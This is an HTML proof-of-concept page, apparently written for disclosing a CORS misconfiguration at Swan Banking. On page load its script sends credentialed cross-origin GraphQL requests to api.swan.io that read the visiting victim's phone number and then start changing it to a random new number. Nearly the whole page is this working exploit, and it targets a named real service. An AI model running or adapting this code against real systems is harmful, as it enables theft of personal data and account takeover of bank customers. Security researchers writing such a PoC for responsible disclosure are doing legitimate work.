<h2>⚠️ Swan Banking – Critical CORS Misconfiguration PoC ⚠️</h2>
<p>
  This page is served from <strong id="origin"></strong>.<br>
  All requests below run <em>automatically</em> with your <code>api.swan.io</code> cookies
  (no JWT, no custom header).
</p>

<h3>Live log</h3>
<pre id="log">Running…</pre>

<script>
  const log = t => document.getElementById('log').textContent += t + '\n';
  document.getElementById('origin').textContent = location.origin;

  async function gql(path, query) {
    const res = await fetch(`https://api.swan.io${path}`, {
      method:  'POST',
      credentials: 'include',
      headers: { 'Content-Type': 'application/json' },
      body: JSON.stringify({ query })
    });
    const txt = await res.text();
    log(`=== ${path} ===\nStatus: ${res.status} ${res.statusText}\n${txt}\n`);
    return JSON.parse(txt).data;
  }

  (async () => {
    // 1) Try to read the victim's number
    let oldN = '+33600000002';
    const whoami = await gql('/admin-auth/graphql', '{ user { mobilePhoneNumber } }');
    if (whoami && whoami.user && whoami.user.mobilePhoneNumber) {
      oldN = whoami.user.mobilePhoneNumber;
      log(`✅ Read victim’s phone: ${oldN}\n`);
    } else {
      log(`⚠️ Could not read phone (not logged in) – using dummy: ${oldN}\n`);
    }

    // 2) Generate a valid new number: +33 6 XXXXXXXX (8 digits)
    const rand8 = () => Math.floor(10000000 + Math.random() * 90000000);
    const newN = '+336' + String(rand8());
    log(`▶ Attempting change from ${oldN} → ${newN}\n`);

    // 3) Queue the phone-change mutation
    const mutation = `
      mutation {
        startPhoneNumberModification(input:{
          oldPhoneNumber:"${oldN}",
          newPhoneNumber:"${newN}"
        }) {
          __typename
          ... on StartPhoneNumberModificationSuccessPayload {
            phoneNumberModification { id }
          }
          ... on PhoneNumberModificationAlreadyExistsRejection { message }
          ... on TooManyPhoneNumberModificationRejection { message }
        }
      }`;
    await gql('/admin-auth/graphql', mutation);
  })();
</script>
